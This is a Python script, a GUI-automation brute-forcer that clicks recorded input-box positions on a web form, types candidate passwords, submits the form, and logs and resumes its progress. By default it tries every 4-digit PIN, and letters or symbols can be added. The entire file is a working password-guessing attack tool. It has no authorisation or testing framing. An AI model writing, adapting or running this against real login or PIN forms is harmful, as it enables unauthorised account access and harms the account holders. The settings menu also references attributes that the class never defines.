import pyautogui
import random
import json
import os
import time
import keyboard
from datetime import datetime
from pynput import mouse as mouse_listener
import itertools
import string
import pyperclip

pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0

# Default configuration values - change these to modify defaults everywhere
DEFAULTS = {
    'delay_between_boxes': 0.1,
    'delay_between_cycles': 0,
    'delay_between_actions': 0.01,
    'submission_method': 'enter',
    'submit_button_pos': None,
    'password_length': 4,
    'include_letters': False,
    'include_special': False,
    'enable_position_adjustment': False,  # New setting: retry positioning when detection fails
}

class SmartPasswordBruteForcer:
    def __init__(self, state_file="brute_force_state.json", log_file="attempts_log.txt", config_file=".config"):
        """
        Initialize the brute forcer with persistent state tracking
        """
        self.state_file = state_file
        self.log_file = log_file
        self.config_file = config_file
        self.used_combinations = set()
        self.all_combinations = set(f"{i:04d}" for i in range(10000))
        self.attempts_count = 0
        self.current_passwords = []  # Store multiple passwords for each cycle
        self.running = True
        self.select_boxes = []  # Store positions of select boxes
        self.delay_between_boxes = DEFAULTS['delay_between_boxes']  # Delay between boxes
        self.delay_between_cycles = DEFAULTS['delay_between_cycles']  # Delay between cycles
        self.delay_between_actions = DEFAULTS['delay_between_actions']  # Delay between inner actions
        self.submission_method = DEFAULTS['submission_method']  # Submission method
        self.submit_button_pos = DEFAULTS['submit_button_pos']  # Position for submit button if needed
        self.password_length = DEFAULTS['password_length']
        self.include_letters = DEFAULTS['include_letters']
        self.include_special = DEFAULTS['include_special']
        self.enable_position_adjustment = DEFAULTS['enable_position_adjustment']  # New: retry positioning when detection fails
        self.current_cycle = 0
        self.pending_passwords = []  # Passwords carried over from previous cycles
        
        # Load config if exists
        self.load_config()
        
        # Generate combinations based on settings
        self.generate_combinations()
        
        # Load previous state if exists
        self.load_state()
    
    def load_config(self):
        """Load configuration from file"""
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    self.select_boxes = config.get('select_boxes', [])
                    self.delay_between_boxes = config.get('delay_between_boxes', DEFAULTS['delay_between_boxes'])
                    self.delay_between_cycles = config.get('delay_between_cycles', DEFAULTS['delay_between_cycles'])
                    self.delay_between_actions = config.get('delay_between_actions', DEFAULTS['delay_between_actions'])
                    self.submission_method = config.get('submission_method', DEFAULTS['submission_method'])
                    self.submit_button_pos = config.get('submit_button_pos', DEFAULTS['submit_button_pos'])
                    self.password_length = config.get('password_length', DEFAULTS['password_length'])
                    self.include_letters = config.get('include_letters', DEFAULTS['include_letters'])
                    self.include_special = config.get('include_special', DEFAULTS['include_special'])
                    self.enable_position_adjustment = config.get('enable_position_adjustment', DEFAULTS['enable_position_adjustment'])
                    print(f"Configuration loaded from {self.config_file}")
            except Exception as e:
                print(f"⚠ Error loading config file: {e}")
        else:
            print("No configuration file found. Will prompt for setup.")
    
    def save_config(self):
        """Save configuration to file"""
        try:
            config = {
                'select_boxes': self.select_boxes,
                'delay_between_boxes': self.delay_between_boxes,
                'delay_between_cycles': self.delay_between_cycles,
                'delay_between_actions': self.delay_between_actions,
                'submission_method': self.submission_method,
                'submit_button_pos': self.submit_button_pos,
                'password_length': self.password_length,
                'include_letters': self.include_letters,
                'include_special': self.include_special,
                'enable_position_adjustment': self.enable_position_adjustment,
                'last_updated': datetime.now().isoformat()
            }
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=2)
            print(f"✓ Configuration saved to {self.config_file}")
        except Exception as e:
            print(f"⚠ Error saving config: {e}")
    
    def generate_combinations(self):
        """Generate all possible password combinations based on settings"""
        chars = string.digits
        if self.include_letters:
            chars += string.ascii_letters
        if self.include_special:
            chars += string.punctuation
        
        total_possible = len(chars) ** self.password_length
        print(f"Generating {total_possible} possible combinations (length={self.password_length}, chars={len(chars)})...")
        if total_possible > 10000000:  # Warn if too large
            print("Warning: Large number of combinations may take time and memory.")
        
        self.all_combinations = set(''.join(p) for p in itertools.product(chars, repeat=self.password_length))
        print(f"Generated {len(self.all_combinations)} combinations.")
        
    def load_state(self):
        """Load previously tried combinations from JSON file"""
        if os.path.exists(self.state_file):
            try:
                with open(self.state_file, 'r') as f:
                    data = json.load(f)
                    self.used_combinations = set(data.get('used_combinations', []))
                    self.attempts_count = data.get('attempts_count', 0)
                    self.select_boxes = data.get('select_boxes', [])
                    self.pending_passwords = data.get('pending_passwords', [])
                    print(f"Loaded previous state: {self.attempts_count} attempts already made")
                    print(f"Remaining combinations: {len(self.all_combinations) - len(self.used_combinations)}")
                    if self.select_boxes:
                        print(f"Loaded {len(self.select_boxes)} select box positions")
            except Exception as e:
                print(f"⚠ Error loading state file: {e}")
        else:
            print("Starting fresh - no previous state found")
    
    def save_state(self):
        """Save current state to JSON file"""
        try:
            data = {
                'used_combinations': list(self.used_combinations),
                'attempts_count': self.attempts_count,
                'select_boxes': self.select_boxes,
                'pending_passwords': self.pending_passwords,
                'last_updated': datetime.now().isoformat(),
                'remaining': len(self.all_combinations) - len(self.used_combinations)
            }
            with open(self.state_file, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            print(f"⚠ Error saving state: {e}")
    
    def log_attempt(self, passwords, cycle_num=0, success=False):
        """Log each attempt to a text file"""
        try:
            with open(self.log_file, 'a') as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                status = "SUCCESS" if success else "ATTEMPT"
                passwords_str = " | ".join(passwords)
                f.write(f"[{timestamp}] {status}: [{passwords_str}] | Cycle: {cycle_num}\n")
        except Exception as e:
            print(f"⚠ Error logging attempt: {e}")
    
    def get_random_unused_passwords(self, count):
        """Get random unused passwords for multiple boxes"""
        remaining = self.all_combinations - self.used_combinations
        if len(remaining) < count:
            return None
        
        # Randomly select unique passwords
        selected = random.sample(list(remaining), count)
        return selected
    
    def get_progress(self):
        """Get current progress percentage"""
        total = len(self.all_combinations)
        tried = len(self.used_combinations)
        return (tried / total) * 100 if total > 0 else 0
    
    def find_working_box_position(self, box_position, password, max_attempts=3):
        """Try to find a working position for the input box with limited attempts"""
        x, y = box_position
        
        # Prioritized search pattern: center, then cross pattern, then corners
        # This is more efficient than full 3x3 grid
        search_positions = [
            (0, 0),    # Original position (already tried, but included for completeness)
            (0, -3),   # Up
            (0, 3),    # Down
            (-3, 0),   # Left
            (3, 0),    # Right
            (-2, -2),  # Up-left
            (2, -2),   # Up-right
            (-2, 2),   # Down-left
            (2, 2),    # Down-right
        ]
        
        attempts = 0
        for dx, dy in search_positions[1:]:  # Skip (0,0) since we already tried it
            if attempts >= max_attempts:
                break
                
            test_x, test_y = x + dx, y + dy
            attempts += 1
            
            # Quick click and test
            pyautogui.click(test_x, test_y)
            
            if self.delay_between_actions > 0:
                time.sleep(self.delay_between_actions)
            
            pyautogui.hotkey('ctrl', 'a')
            pyautogui.press('delete')
            
            if self.delay_between_actions > 0:
                time.sleep(self.delay_between_actions)
            
            pyautogui.write(password, interval=0.0005)
            
            if self.delay_between_actions > 0:
                time.sleep(self.delay_between_actions)
            
            # Quick verify
            pyautogui.hotkey('ctrl', 'a')
            pyautogui.hotkey('ctrl', 'c')
            pasted_text = pyperclip.paste()
            
            if pasted_text == password:
                return (test_x, test_y)
        
        return None  # No working position found
    
    def type_password(self, password, box_position):
        """Type password into select box and verify it was pasted, with optimized position correction"""
        # Fast first attempt with stored position
        pyautogui.click(box_position[0], box_position[1])
        
        if self.delay_between_actions > 0:
            time.sleep(self.delay_between_actions)
        
        pyautogui.hotkey('ctrl', 'a')
        pyautogui.press('delete')
        
        if self.delay_between_actions > 0:
            time.sleep(self.delay_between_actions)
        
        pyautogui.write(password, interval=0.0005)
        
        if self.delay_between_actions > 0:
            time.sleep(self.delay_between_actions)
        
        # Quick verify - be less intrusive
        time.sleep(0.01)  # Small delay before verification
        pyautogui.hotkey('ctrl', 'a')
        time.sleep(0.01)
        pyautogui.hotkey('ctrl', 'c')
        time.sleep(0.01)  # Small delay for clipboard
        pasted_text = pyperclip.paste()
        
        if pasted_text == password:
            # Ensure input field is focused after verification
            pyautogui.click(box_position[0], box_position[1])
            if self.delay_between_actions > 0:
                time.sleep(self.delay_between_actions)
            return True
        
        # Position adjustment: retry finding working position if enabled
        if self.enable_position_adjustment:
            working_position = self.find_working_box_position(box_position, password, max_attempts=3)
            
            if working_position:
                # Found working position - update stored position
                box_index = self.select_boxes.index(box_position)
                self.select_boxes[box_index] = working_position
                self.save_config()  # Save corrected position immediately
                return True
        
        # Could not find working position or adjustment disabled
        return False
    
    def submit_form(self):
        """Submit the form using the configured method"""
        if self.submission_method == "enter":
            # Standard Enter key
            pyautogui.press('enter')
            
        elif self.submission_method == "tab_enter":
            # Tab to next field, then Enter
            pyautogui.press('tab')
            time.sleep(0.01)
            pyautogui.press('enter')
            
        elif self.submission_method == "click_button" and self.submit_button_pos:
            # Click submit button
            pyautogui.click(self.submit_button_pos[0], self.submit_button_pos[1])
            
        elif self.submission_method == "ctrl_enter":
            # Ctrl+Enter combination
            pyautogui.hotkey('ctrl', 'enter')
            
        elif self.submission_method == "space":
            # Space key
            pyautogui.press('space')
            
        else:
            # Default to Enter
            pyautogui.press('enter')
    
    def stop_script(self):
        """Stop the brute force process"""
        self.running = False
        print(f"Final progress: {self.get_progress():.2f}%")
        print(f"Total cycles completed: {self.current_cycle}")
        print(f"Total passwords tried: {self.attempts_count}")
        self.save_state()
        print("State saved. You can resume later by running the script again!")
    
    def execute_attempt_cycle(self, passwords):
        """Execute a full cycle of typing multiple passwords into multiple select boxes"""

        successful_passwords = []
        remaining_passwords = []
        
        # Track failed passwords that can be retried in subsequent boxes
        retry_password = None
        
        for idx, box_pos in enumerate(self.select_boxes, 1):
            # Check if we should stop immediately
            if not self.running:
                break
                
            # Determine which password to try for this box
            if retry_password is not None:
                # Use the retry password from a previous failed box
                password = retry_password
                retry_password = None  # Clear it after use
            elif idx-1 < len(passwords):
                # Use the assigned password for this box
                password = passwords[idx-1]
            else:
                print(f"   ⚠ Skipped box {idx}: No password available")
                continue
            
            success = self.type_password(password, box_pos)
            
            # Check again if we should stop (in case it was triggered during type_password)
            if not self.running:
                if not success:
                    remaining_passwords.append(password)
                break
            
            if success:
                # Ensure input field is focused and ready for submission
                time.sleep(0.05)  # Give time for any JavaScript processing
                pyautogui.click(box_pos[0], box_pos[1])  # Refocus the input field
                if self.delay_between_actions > 0:
                    time.sleep(self.delay_between_actions)
                self.submit_form()
                successful_passwords.append(password)
                print(f"✓ Success box {idx}/{len(self.select_boxes)}: '{password}'")
                retry_password = None  # Clear any retry password since we succeeded
            else:
                print(f"⚠  Failed box {idx}/{len(self.select_boxes)}: '{password}' - Skipping")
                # This password will be retried in the next box
                retry_password = password
                remaining_passwords.append(password)
            
            # Check if we should stop after processing this box
            if not self.running:
                break
            
            # Apply delay between boxes (if configured and not the last box)
            if idx < len(self.select_boxes) and self.delay_between_boxes > 0:
                time.sleep(self.delay_between_boxes)
        
        print(f"Cycle completed: {len(successful_passwords)} ✓ | {len(remaining_passwords)} ⚠")
        return successful_passwords, remaining_passwords
    
    def brute_force(self, delay_between_boxes=0.05, delay_between_cycles=1):
        """
        Main brute force loop with multiple passwords per cycle
        
        Args:
            delay_between_boxes: Delay between typing into different boxes (seconds)
            delay_between_cycles: Delay between complete cycles (seconds)
        """
        self.delay_between_boxes = delay_between_boxes
        self.delay_between_cycles = delay_between_cycles
        
        print("\n" + "=" * 60)
        print("SMART MULTI-PASSWORD BRUTE FORCER")
        print("=" * 60)
        print(f"Number of select boxes: {len(self.select_boxes)}")
        for idx, pos in enumerate(self.select_boxes, 1):
            print(f"   Box {idx}: {pos}")
        print(f"Delay between boxes: {self.delay_between_boxes}s (default = {DEFAULTS['delay_between_boxes']})")
        print(f"Delay between cycles: {self.delay_between_cycles}s (default = {DEFAULTS['delay_between_cycles']})")
        print(f"Delay between actions: {self.delay_between_actions}s (default = {DEFAULTS['delay_between_actions']})")
        print(f"Submission method: {self.submission_method}")
        if self.submit_button_pos:
            print(f"Submit button: {self.submit_button_pos}")
        print(f"Password length: {self.password_length}")
        print(f"Include letters: {self.include_letters}")
        print(f"Include special: {self.include_special}")
        print(f"State file: {self.state_file}")
        print(f"Log file: {self.log_file}")
        print("\nCONTROLS:")
        print("   Press 'C' at any time to stop the script and save progress")
        print("   Progress is automatically saved after every 10 cycles")
        
        remaining = len(self.all_combinations) - len(self.used_combinations)
        print(f"\nRemaining passwords to try: {remaining}/{len(self.all_combinations)}")
        print(f"Each cycle will try {len(self.select_boxes)} different passwords")
        
        print("\nStarting in 3 seconds. Focus the browser window!")
        
        # Countdown
        for i in range(3, 0, -1):
            print(f"{i}...")
            time.sleep(0.8)
        
        print("\nStarting brute force...\n")
        start_time = time.time()
        
        # Register hotkey to stop the script
        keyboard.add_hotkey('c', self.stop_script)
        
        try:
            while self.running:
                # Get passwords: pending first, then new random unused
                num_pending = len(self.pending_passwords)
                num_needed = len(self.select_boxes) - num_pending
                if num_needed > 0:
                    new_passwords = self.get_random_unused_passwords(num_needed)
                    if new_passwords is None:
                        new_passwords = []
                    passwords = self.pending_passwords + new_passwords
                else:
                    passwords = self.pending_passwords[:len(self.select_boxes)]  # In case more pending than boxes
                    self.pending_passwords = self.pending_passwords[len(self.select_boxes):]
                
                if not passwords:
                    print("\nNo more passwords to try!")
                    break
                
                self.current_cycle += 1
                
                # Execute the attempt cycle
                successful_passwords, remaining_passwords = self.execute_attempt_cycle(passwords)
                
                # Add only successful passwords to used set
                for pwd in successful_passwords:
                    self.used_combinations.add(pwd)
                self.attempts_count += len(successful_passwords)
                
                # Set pending for next cycle
                self.pending_passwords = remaining_passwords
                
                # Display progress after execution
                progress = self.get_progress()
                elapsed = time.time() - start_time
                avg_cycle_time = elapsed / self.current_cycle if self.current_cycle > 0 else 0
                remaining_combinations = len(self.all_combinations) - len(self.used_combinations)
                remaining_cycles = remaining_combinations / len(self.select_boxes) if len(self.select_boxes) > 0 else 0
                estimated_remaining_time = remaining_cycles * avg_cycle_time
                print(f"Elapsed: {elapsed/60:.0f}min | Remaining: {estimated_remaining_time/60:.0f}min | Cycle: {avg_cycle_time:.2f}s")
                print(f"Cycle {self.current_cycle} | Progress: {progress:.2f}% | Remaining combinations: {remaining_combinations}")
                # Log the successful attempt
                if successful_passwords:
                    self.log_attempt(successful_passwords, self.current_cycle, success=True)
                
                # Wait before next cycle
                if self.delay_between_cycles > 0:
                    time.sleep(self.delay_between_cycles)
                
                # Save state every 10 cycles
                if self.current_cycle % 10 == 0:
                    self.save_state()
                    print(f"   Auto-saved at cycle {self.current_cycle}")
            
            # Final save
            self.save_state()
            
            # Print summary
            elapsed_time = time.time() - start_time
            avg_cycle_time = elapsed_time / self.current_cycle if self.current_cycle > 0 else 0
            passwords_per_minute = (self.attempts_count / elapsed_time) * 60 if elapsed_time > 0 else 0
            print("\n" + "=" * 60)
            print("BRUTE FORCE COMPLETED")
            print("=" * 60)
            print(f"Total cycles: {self.current_cycle}")
            print(f"Total passwords tried: {self.attempts_count}")
            print(f"Remaining passwords: {len(self.all_combinations) - len(self.used_combinations)}")
            print(f"Time elapsed: {elapsed_time:.2f} seconds ({elapsed_time/60:.2f} minutes)")
            print(f"Average cycle time: {avg_cycle_time:.2f} seconds")
            print(f"Passwords per minute: {passwords_per_minute:.2f}")
            print(f"Average speed: {self.attempts_count / elapsed_time:.2f} passwords/second")
            print(f"State saved to: {self.state_file}")
            print(f"Full log saved to: {self.log_file}")
            
        except KeyboardInterrupt:
            print("\n\nKeyboard interrupt detected!")
            self.stop_script()
        except Exception as e:
            print(f"\nError occurred: {e}")
            self.save_state()
            print("State saved before error")

def capture_click_position(prompt_message, box_number=None):
    """Capture mouse click position"""
    box_text = f" (Box {box_number})" if box_number else ""
    print(f"\n{prompt_message}{box_text}")
    print("   Click anywhere on the screen to set this position...")
    print("   (Or press 'ESC' to skip/cancel)")
    
    clicked_position = None
    
    def on_click(x, y, button, pressed):
        nonlocal clicked_position
        if pressed and button == mouse_listener.Button.left:
            clicked_position = (x, y)
            return False  # Stop listener
        return True
    
    # Start mouse listener
    with mouse_listener.Listener(on_click=on_click) as listener:
        listener.join()
    
    if clicked_position:
        print(f"   Position captured: ({clicked_position[0]}, {clicked_position[1]})")
        return clicked_position
    else:
        print("   Skipped")
        return None

def setup_select_boxes():
    """Setup multiple select boxes by clicking"""
    print("\n" + "=" * 60)
    print("SETUP SELECT BOXES")
    print("=" * 60)
    
    while True:
        try:
            num_boxes = int(input("   Number of boxes (1-999): "))
            if 1 <= num_boxes <= 999:
                break
            else:
                print("   ⚠ Please enter a number between 1 and 999")
        except ValueError:
            print("   ⚠ Please enter a valid number")
    
    select_boxes = []
    print(f"\nCAPTURING {num_boxes} INPUT BOX POSITION{'S' if num_boxes > 1 else ''}")
    print("   Click inside each input field when prompted")
    input("   Press Enter when ready to start capturing positions...")
    
    for i in range(1, num_boxes + 1):
        print(f"\n--- Box {i} of {num_boxes} ---")
        pos = capture_click_position("Click on the SELECT BOX", i)
        if pos:
            select_boxes.append(pos)
        else:
            print(f"Box {i} skipped")
    
    if not select_boxes:
        print("\nNo select boxes selected. Exiting setup.")
        return None
    
    print("\n" + "=" * 60)
    print("SELECT BOXES CAPTURED SUCCESSFULLY!")
    for idx, pos in enumerate(select_boxes, 1):
        print(f"Box {idx}: {pos}")
    print("=" * 60)
    
    return select_boxes

def setup_and_configure(forcer):
    """Setup select boxes and configure delays"""
    select_boxes = setup_select_boxes()
    if not select_boxes:
        return False
    
    forcer.select_boxes = select_boxes
    
    print("\nPerformance Configuration:")
    print("(Smaller values = faster but may miss keystrokes)")
    print()
    
    box_delay = input(f"   Delay between boxes (seconds, default={DEFAULTS['delay_between_boxes']}): ").strip()
    forcer.delay_between_boxes = float(box_delay) if box_delay else DEFAULTS['delay_between_boxes']
    print(f"   ✓ Set to: {forcer.delay_between_boxes}s")
    print()
    
    cycle_delay = input(f"   Delay between cycles (seconds, default={DEFAULTS['delay_between_cycles']}): ").strip()
    forcer.delay_between_cycles = float(cycle_delay) if cycle_delay else DEFAULTS['delay_between_cycles']
    print(f"   ✓ Set to: {forcer.delay_between_cycles}s")
    print()
    
    action_delay = input(f"   Delay between actions (seconds, default={DEFAULTS['delay_between_actions']}): ").strip()
    forcer.delay_between_actions = float(action_delay) if action_delay else DEFAULTS['delay_between_actions']
    print(f"   ✓ Set to: {forcer.delay_between_actions}s")
    print()
    
    adjustment_input = input(f"   Enable Position Adjustment  (y/n, default={'y' if DEFAULTS['enable_position_adjustment'] else 'n'}): ").strip().lower()
    forcer.enable_position_adjustment = adjustment_input == 'y'
    print(f"   ✓ Set to: {'Enabled' if forcer.enable_position_adjustment else 'Disabled'}")
    print()
    
    print("Form submission method")
    print("   • enter = Press Enter key (most common)")
    print("   • tab_enter = Press Tab then Enter (some forms)")
    print("   • click_button = Click submit button (if Enter doesn't work)")
    print("   • ctrl_enter = Press Ctrl+Enter (rare)")
    print("   • space = Press Space key (rare)")
    submission_method = input(f"   Method (default={DEFAULTS['submission_method']}): ").strip().lower()
    if submission_method in ['enter', 'tab_enter', 'click_button', 'ctrl_enter', 'space']:
        forcer.submission_method = submission_method
        print(f"   ✓ Set to: {forcer.submission_method}")
        if submission_method == 'click_button':
            print()
            print("   Click on the submit/login button on the webpage")
            input("   Press Enter when ready to click the submit button...")
            pos = capture_click_position("Click on the SUBMIT BUTTON")
            if pos:
                forcer.submit_button_pos = pos
                print(f"   ✓ Submit button captured: {pos}")
            else:
                print("   ⚠ No position captured. Using 'enter' as fallback.")
                forcer.submission_method = 'enter'
    else:
        forcer.submission_method = 'enter'
        print("   ✓ Set to: enter (default)")
    print()
    
    print("\nPassword configurations:")
    print()
    
    length_input = input(f"   Password Length (default={DEFAULTS['password_length']}): ").strip()
    forcer.password_length = int(length_input) if length_input else DEFAULTS['password_length']
    print(f"   ✓ Set to: {forcer.password_length} characters")
    print()
    
    letters_input = input(f"   Include letters (A-Z, a-z)? (y/n, default={'y' if DEFAULTS['include_letters'] else 'n'}): ").strip().lower()
    forcer.include_letters = letters_input == 'y'
    print(f"   ✓ Letters: {'Yes' if forcer.include_letters else 'No'}")
    
    special_input = input(f"   Include special chars (!@#$%)? (y/n, default={'y' if DEFAULTS['include_special'] else 'n'}): ").strip().lower()
    forcer.include_special = special_input == 'y'
    print(f"   ✓ Special characters: {'Yes' if forcer.include_special else 'No'}")
    
    # Show character set summary
    chars = "digits (0-9)"
    if forcer.include_letters:
        chars += " + letters (A-Z, a-z)"
    if forcer.include_special:
        chars += " + special (!@#$%^&*)"
    print(f"   Total combinations: ~{len('0123456789' + (string.ascii_letters if forcer.include_letters else '') + (string.punctuation if forcer.include_special else '')) ** forcer.password_length:,}")
    print()
    
    forcer.generate_combinations()
    forcer.save_config()
    return True

def view_state(state_file="brute_force_state.json"):
    """View current state and configuration"""
    config_file = ".config"
    if os.path.exists(config_file):
        with open(config_file, 'r') as f:
            config = json.load(f)
            print("\n" + "=" * 60)
            print("CURRENT CONFIGURATION")
            print("=" * 60)
            print(f"Select boxes: {len(config.get('select_boxes', []))}")
            for idx, pos in enumerate(config.get('select_boxes', []), 1):
                print(f"   Box {idx}: {pos}")
            print(f"Delay between boxes: {config.get('delay_between_boxes', 0)}s")
            print(f"Delay between cycles: {config.get('delay_between_cycles', 1)}s")
            print(f"Delay between actions: {config.get('delay_between_actions', 0.01)}s")
            print(f"Submission method: {config.get('submission_method', 'enter')}")
            if config.get('submit_button_pos'):
                print(f"Submit button position: {config.get('submit_button_pos')}")
            print(f"Password length: {config.get('password_length', 4)}")
            print(f"Include letters: {config.get('include_letters', False)}")
            print(f"Include special: {config.get('include_special', False)}")
            print(f"Pending passwords: {len(config.get('pending_passwords', []))}")
            print(f"Last updated: {config.get('last_updated', 'Unknown')}")
            print("=" * 60)
    
    if os.path.exists(state_file):
        with open(state_file, 'r') as f:
            data = json.load(f)
            print("\n" + "=" * 60)
            print("CURRENT STATE")
            print("=" * 60)
            print(f"Cycles completed: {data.get('current_cycle', 0)}")
            print(f"Passwords tried: {data.get('attempts_count', 0)}")
            print(f"Pending passwords: {len(data.get('pending_passwords', []))}")
            print(f"Remaining: {data.get('remaining', 'Unknown')}")
            print(f"Last updated: {data.get('last_updated', 'Unknown')}")
            print("=" * 60)
            
            # Show last 10 attempts
            log_file = "attempts_log.txt"
            if os.path.exists(log_file):
                print("\nLast 10 cycles:")
                with open(log_file, 'r') as f:
                    lines = f.readlines()
                    for line in lines[-10:]:
                        print(f"   {line.strip()}")
    else:
        print("No state file found.")

def reset_state():
    """Reset the state file"""
    confirm = input("Are you sure you want to reset all progress? (yes/no): ")
    if confirm.lower() == 'yes':
        files_to_reset = ["brute_force_state.json", "attempts_log.txt"]
        for file in files_to_reset:
            if os.path.exists(file):
                os.remove(file)
        print("State and log files have been reset!")
    else:
        print("Reset cancelled.")

def live_coordinates():
    """Show live mouse coordinates"""
    print("\nLIVE COORDINATE TRACKER")
    print("Move your mouse to see coordinates")
    print("Press 'ESC' to exit\n")
    
    try:
        while True:
            if keyboard.is_pressed('esc'):
                break
            pos = pyautogui.position()
            print(f"\rX: {pos.x:4d} Y: {pos.y:4d}", end='', flush=True)
            time.sleep(0.05)
    except:
        pass
    print("\n\nCoordinate tracker ended.")

if __name__ == "__main__":
    # Install required libraries first:
    # pip install pyautogui keyboard pynput
    
    print("MULTI-PASSWORD BRUTE FORCER")
    print("=" * 60)
    print("\nMENU:")
    print("1. Start brute force")
    print("2. View current progress and configuration")
    print("3. Reset all progress")
    print("4. Live coordinate tracker")
    print("5. Change settings")
    print("6. Exit")
    
    choice = input("\nSelect option (1-6): ").strip()
    
    if choice == '1' or choice == '':
        forcer = SmartPasswordBruteForcer()
        if os.path.exists('.config'):
            print("Using saved configuration.")
            forcer.brute_force(forcer.delay_between_boxes, forcer.delay_between_cycles)
        else:
            print("No configuration found. Setting up...")
            if setup_and_configure(forcer):
                forcer.brute_force(forcer.delay_between_boxes, forcer.delay_between_cycles)
            else:
                print("Failed to setup. Please try again.")
    
    elif choice == '2':
        view_state()
    
    elif choice == '3':
        reset_state()
    
    elif choice == '4':
        live_coordinates()
    
    elif choice == '5':
        forcer = SmartPasswordBruteForcer()
        if setup_and_configure(forcer):
            print(" SETTINGS UPDATED")
            print()
            print(" NEW CONFIGURATION:")
            print(f"   • Input boxes: {len(forcer.select_boxes)}")
            print(f"   • Password length: {forcer.password_length}")
            chars = "digits (0-9)"
            if forcer.include_letters:
                chars += " + letters (A-Z, a-z)"
            if forcer.include_special:
                chars += " + special (!@#$%^&*)"
            print(f"   • Character set: {chars}")
            print(f"   • Box delay: {forcer.box_delay}s")
            print(f"   • Cycle delay: {forcer.cycle_delay}s")
            print(f"   • Action delay: {forcer.action_delay}s")
            print(f"   • Position adjustment: {'Enabled' if forcer.enable_position_adjustment else 'Disabled'}")
            print(f"   • Submission: {forcer.submission_method}")
            if forcer.submission_method == 'click_button' and forcer.submit_button_pos:
                print(f"   • Submit button: {forcer.submit_button_pos}")
            print()
            print(" Configuration saved to .config file")
            print(" Ready to start brute forcing with option 1!")
        else:
            print("Failed to update settings.")
    
    elif choice == '6':
        print("Goodbye!")
    
    else:
        print("Invalid option!")